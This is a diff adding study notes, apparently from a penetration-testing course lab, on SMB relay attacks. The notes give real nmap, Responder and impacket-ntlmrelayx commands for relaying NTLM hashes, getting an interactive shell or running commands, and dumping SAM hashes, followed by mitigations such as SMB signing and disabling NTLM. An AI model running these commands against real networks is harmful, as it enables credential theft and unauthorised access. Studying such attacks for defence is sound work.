@@ -1,0 +1,42 @@
+# SMB Relay Attacks Overview
+
+- Instead of cracking hashes, we can relay the hash using SMB
+- Requirements:
+    - SMB signing must be disabled on the target
+        - by default it is not enabled on workstations but it is on servers
+    - Relayed user creds must be admin on machine to have value (local admin)
+- Identify Hosts Without SMB Signing
+    - nmap —script=smb2-security-mode.nse -p445 <ip>
+        - looking for “enabled but not required”
+    - Add to a file (mousepad targets.txt)
+- Run Responder
+    - sudo mousepad /etc/responder/Responder.conf
+        - turn off SMB and HTTP
+    - sudo responder -I eth0 -dP (will likely use tun0)
+- Set up SMB Relay
+    - sudo [ntlmrelayx.py](http://ntlmrelayx.py) -tf targets.txt -smb2support
+    - I WILL USE: impacket-ntlmrelayx -tf targets.txt -smb2support
+    - Options:
+        - can add -i at the end to get an ip and port to nc to
+            - nc <ip> <port>
+        - commands
+            - -c “<command>”
+- Wait for traffic (on the lab, typed in attacker ip into file explorer)
+- the impacket-ntlmrelayx terminal window will dump SAM Hashes
+    - Save these hashes into a file
+
+# SMB Relay Attack Defenses
+
+- Mitigation Strategies
+    - Enable SMB signing on all devices
+        - pro: completely stops the attack
+        - can: may decrease 10-20% of speed of file copies
+    - Disable NTLM authentication on network
+        - Pro: completely stops the attack
+        - Cons: if Kerberos stops working, Windows will default to NTLM
+    - Account Tiering:
+        - Pro: limits domain admins to specific accounts
+        - Cons: enforcing policy may be challenging
+    - Local Admin Restriction
+        - Pro: can prevent lateral movement
+        - Cons: can increase service desk tickets
